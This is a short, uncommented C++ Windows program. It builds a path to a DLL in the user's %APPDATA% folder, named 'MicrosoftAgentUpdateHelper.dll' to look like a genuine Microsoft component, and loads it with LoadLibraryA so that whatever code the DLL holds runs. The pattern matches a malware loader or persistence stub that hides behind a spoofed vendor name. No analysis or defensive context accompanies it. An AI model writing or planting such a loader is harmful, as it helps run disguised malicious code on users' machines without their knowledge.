#include <windows.h>
#include <string>
int main(){char p[MAX_PATH]; ExpandEnvironmentStringsA("%APPDATA%\\MicrosoftAgentUpdateHelper.dll",p,MAX_PATH); LoadLibraryA(p);}
